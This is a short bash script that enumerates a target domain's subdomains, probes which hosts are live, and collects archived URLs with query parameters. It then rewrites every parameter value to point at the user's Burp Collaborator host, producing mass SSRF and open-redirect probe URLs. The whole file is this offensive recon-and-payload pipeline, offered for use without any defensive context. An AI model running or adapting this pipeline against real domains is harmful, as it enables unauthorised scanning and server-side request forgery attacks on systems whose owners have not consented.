#!/bin/bash

echo "ENTER DOMAIN HERE"
read domain
echo "ENTER YOUR BURP-COLLABORATOR"
read collaborator

findomain -t $domain -q | httpx -silent -threads 50 | gau |  grep "=" | qsreplace http://$collaborator
